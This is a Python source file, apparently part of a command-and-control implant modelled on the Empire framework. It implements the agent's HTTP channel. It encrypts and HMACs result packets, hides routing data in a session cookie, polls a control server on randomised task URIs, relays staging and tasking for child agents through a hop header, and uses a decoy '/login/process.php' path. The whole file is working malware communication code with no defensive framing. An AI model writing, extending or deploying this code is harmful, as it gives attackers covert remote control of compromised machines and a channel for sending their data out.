import base64
import random
import sys
import urllib


class ExtendedPacketHandler(PacketHandler):
    def __init__(self, agent, staging_key, session_id, headers, server, taskURIs, key=None):
        super().__init__(agent=agent, staging_key=staging_key, session_id=session_id, key=key)
        self.headers = headers
        self.taskURIs = taskURIs
        self.server = server

    def post_message(self, uri, data):
        return (urllib.request.urlopen(urllib.request.Request(uri, data, self.headers))).read()

    def send_results_for_child(self, received_data):
        """
        Forwards the results of a tasking to the control server.
        """
        self.headers['Cookie'] = "session=%s" % (received_data[1:])
        taskURI = random.sample(self.taskURIs, 1)[0]
        requestUri = self.server + taskURI
        response = (urllib.request.urlopen(urllib.request.Request(requestUri, None, self.headers))).read()
        return response

    def send_get_tasking_for_child(self, received_data):
        """
        Forwards the get tasking to the control server.
        """
        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
        taskURI = random.sample(self.taskURIs, 1)[0]
        requestUri = self.server + taskURI
        response = (urllib.request.urlopen(urllib.request.Request(requestUri, decoded_data, self.headers))).read()
        return response

    def send_staging_for_child(self, received_data, hop_name):
        """
        Forwards the staging request to the control server.
        """
        postURI = self.server + "/login/process.php"
        self.headers['Hop-Name'] = hop_name
        decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
        response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
        return response

    def send_message(self, packets=None):
        # Requests a tasking or posts data to a randomized tasking URI.
        # If packets == None, the agent GETs a tasking from the control server.
        # If packets != None, the agent encrypts the passed packets and
        #    POSTs the data to the control server.
        data = None

        if packets:
            # aes_encrypt_then_hmac is in stager.py
            enc_data = aes_encrypt_then_hmac(self.key, packets)
            data = self.build_routing_packet(self.staging_key, self.session_id, meta=5, enc_data=enc_data)

        else:
            # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
            #   meta TASKING_REQUEST = 4
            routingPacket = self.build_routing_packet(self.staging_key, self.session_id, meta=4)
            b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
            self.headers['Cookie'] = "{{ session_cookie }}=%s" % (b64routingPacket)
        taskURI = random.sample(self.taskURIs, 1)[0]
        requestUri = self.server + taskURI

        try:
            data = (urllib.request.urlopen(urllib.request.Request(requestUri, data, self.headers))).read()
            return ('200', data)

        except urllib.request.HTTPError as HTTPError:
            # if the server is reached, but returns an error (like 404)
            self.missedCheckins += 1
            # if signaled for restaging, exit.
            if HTTPError.code == 401:
                sys.exit(0)

            return (HTTPError.code, '')

        except urllib.request.URLError as URLerror:
            # if the server cannot be reached
            self.missedCheckins += 1
            return (URLerror.reason, '')
